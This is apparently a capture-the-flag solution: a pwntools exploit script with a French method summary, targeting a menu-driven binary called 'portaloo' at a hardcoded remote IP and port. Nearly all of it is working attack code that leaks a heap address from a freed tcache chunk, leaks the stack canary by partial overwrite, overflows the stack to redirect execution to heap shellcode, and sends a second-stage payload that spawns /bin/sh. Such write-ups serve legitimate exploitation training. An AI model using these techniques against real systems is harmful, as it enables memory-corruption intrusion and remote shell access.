"""
Méthode : Heap leak → Canary leak → Shellcode execution → ROP

- Heap leak :
  Create portal(0), portal(1)
  Destroy portal(1) → tcache freed chunk
  Peek portal → leak heap address from FD pointer
  Calculate heap base heap_leak << 12

- Shellcode preparation :
  Upgrade portal(0) avec shellcode 
  Shellcode lea rsi, [rip]; syscall → read shellcode

- Canary leak :
  Menu option 5 → trigger buffer overflow
  Send 73 'A's → reach canary 
  Leak canary via partial overwrite 

- ROP :
  Overflow avec padding 72 bytes
  Overwrite canary (restored)
  Overwrite saved RIP avec heap_base + 0x2a0 (shellcode location)

- Shellcode :
  Send stage2 shellcode via read syscall
  NOP sled + shellcraft.sh() → /bin/sh shell
  Bypass NX via shellcode in heap
"""

#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./portaloo')
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote('94.237.123.236', 38641, *a, **kw)
    else:
        # Ajouter un ./ si besoin
        return process(['./portaloo'] + argv, *a, **kw)

def create_portal(idx):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b":", str(idx).encode())

def destroy_portal(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b":", str(idx).encode())

def upgrade_portal(idx, data):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b":", str(idx).encode())
    io.sendafter(b":", data)

def peek_portal():
    io.sendlineafter(b">", b"4")
    io.recvuntil(b"Data")
    io.recvlines(2)
    io.recvuntil(b"Data: ")
    heap = io.recv(5)
    return u64(heap.ljust(8, b"\x00"))

args.REMOTE = True  
io = start()

for i in range(2):
    create_portal(i)

destroy_portal(1)
heap_base = peek_portal() << 12

sc = asm("lea rsi, [rip]; syscall")
upgrade_portal(0, sc)

io.sendlineafter(b">", b"5")
io.sendafter(b">", b"A"*73)
io.recvuntil(b"A"*73)
canary = u64(io.recv(7).rjust(8, b"\x00"))

payload = flat({
    72: [canary, b"A"*8, heap_base + 0x2a0]
})

io.sendafter(b":", payload)
io.send(asm("nop")*0x20 + asm(shellcraft.sh()))
io.interactive()
